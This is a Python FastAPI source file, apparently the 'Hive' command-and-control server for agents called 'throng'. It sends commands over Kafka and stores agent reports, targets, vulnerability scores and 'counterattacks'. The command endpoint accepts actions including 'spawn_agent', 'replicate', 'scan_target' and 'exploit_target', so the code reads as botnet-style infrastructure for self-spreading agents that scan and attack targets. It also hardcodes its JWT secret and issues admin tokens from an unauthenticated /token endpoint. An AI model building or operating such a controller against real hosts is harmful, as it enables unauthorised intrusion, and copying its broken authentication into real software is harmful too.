from fastapi import FastAPI, WebSocket, HTTPException, Depends
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import sqlite3
import json
import time
from pydantic import BaseModel
from kafka import KafkaProducer, KafkaConsumer
from sklearn.ensemble import IsolationForest
import numpy as np
import jwt

app = FastAPI()
security = HTTPBearer()

# Konfigurasi JWT
JWT_SECRET = "throng_secret_key"
JWT_ALGORITHM = "HS256"

# Model untuk perintah
class Command(BaseModel):
    agent_id: str
    action: str
    target: str = None
    params: dict = {}
    emergency: bool = False

# Inisialisasi database SQLite
def init_db():
    conn = sqlite3.connect("throng.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS reports 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, target TEXT, action TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS agents 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets 
                 (id INTEGER PRIMARY KEY, target TEXT, vulnerability TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, score REAL)''')
    c.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# Kafka producer
producer = KafkaProducer(bootstrap_servers=['localhost:9092'], value_serializer=lambda v: json.dumps(v).encode('utf-8'))

# Model Isolation Forest
anomaly_model = IsolationForest(contamination=0.1, random_state=42)

# Analisis ancaman
def analyze_threats(reports):
    data = [[report["data"].get("network_traffic", 0), len(report["data"].get("vulnerability", []))] for report in reports]
    if len(data) < 2:
        return []
    predictions = anomaly_model.fit_predict(np.array(data))
    return [1 if pred == -1 else 0 for pred in predictions]

# Autentikasi JWT
async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(credentials.credentials, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        return payload
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

# Endpoint untuk token
@app.get("/token")
async def get_token():
    payload = {"user": "admin", "exp": time.time() + 3600}
    token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
    return {"token": token}

# Endpoint untuk data dashboard
@app.get("/api/data", dependencies=[Depends(verify_token)])
async def get_dashboard_data():
    conn = sqlite3.connect("throng.db")
    c = conn.cursor()
    c.execute("SELECT agent_id, status, last_seen, ip FROM agents")
    agents = [{"agent_id": row[0], "status": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
    c.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
    targets = [{"target": row[0], "vulnerability": json.loads(row[1]), "status": row[2], "timestamp": row[3], "score": row[4]} for row in c.fetchall()]
    c.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
    reports = [{"agent_id": row[0], "data": json.loads(row[1]), "timestamp": row[2]} for row in c.fetchall()]
    c.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
    emergency_logs = [{"agent_id": row[0], "action": row[1], "details": json.loads(row[2]), "timestamp": row[3]} for row in c.fetchall()]
    conn.close()
    
    anomalies = analyze_threats(reports)
    for i, report in enumerate(reports):
        report["data"]["is_anomaly"] = bool(anomalies[i])
    
    network_data = {
        "nodes": [
            {"id": "hive", "label": "Hive", "group": "hive", "color": "#00b7eb"},
            *[{"id": agent["agent_id"], "label": agent["agent_id"], "group": "agent", "color": "#00ff00"} for agent in agents],
            *[{"id": target["target"], "label": target["target"], "group": "target", "color": "#ff0000" if target["score"] > 0.5 else "#cccccc"} for target in targets]
        ],
        "edges": [
            *[{"from": "hive", "to": agent["agent_id"]} for agent in agents],
            *[{"from": agent["agent_id"], "to": target["target"]} for agent in agents for target in targets if target["status"] == "claimed"]
        ]
    }
    
    return {"agents": agents, "targets": targets, "reports": reports, "emergency_logs": emergency_logs, "network": network_data}

# Endpoint untuk perintah
@app.post("/command", dependencies=[Depends(verify_token)])
async def send_command(command: Command):
    allowed_actions = ["block_ip", "send_honeypot", "redirect_traffic", "spawn_agent", "replicate", "scan_target", "exploit_target"]
    if command.action not in allowed_actions:
        raise HTTPException(status_code=400, detail="Invalid action")
    
    conn = sqlite3.connect("throng.db")
    c = conn.cursor()
    if command.target:
        if command.action in ["block_ip", "send_honeypot", "redirect_traffic", "exploit_target"]:
            c.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
                      (command.agent_id, command.target, command.action))
        elif command.action == "scan_target":
            c.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
                      (command.target, "pending", 0.0))
        if command.emergency:
            c.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
                      (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
    conn.commit()
    conn.close()

    producer.send(f"throng_commands_{command.agent_id}", command.dict())
    return {"status": f"Command {command.action} sent to {command.agent_id}"}

# WebSocket untuk laporan
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    consumer = KafkaConsumer('throng_reports', bootstrap_servers=['localhost:9092'], value_deserializer=lambda x: json.loads(x.decode('utf-8')))
    for msg in consumer:
        report = msg.value
        agent_id = report.get("agent_id")
        report_data = report.get("data")

        conn = sqlite3.connect("throng.db")
        c = conn.cursor()
        c.execute("INSERT INTO reports (agent_id, data) VALUES (?, ?)", (agent_id, json.dumps(report_data)))
        c.execute("INSERT OR REPLACE INTO agents (agent_id, status, last_seen, ip) VALUES (?, ?, ?, ?)", 
                  (agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), report_data.get("ip", "unknown")))
        if "vulnerability" in report_data:
            score = len(report_data.get("vulnerability", [])) * 0.2
            c.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
                      (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
        conn.commit()
        conn.close()

        await websocket.send_text(f"Hive received report from {agent_id}")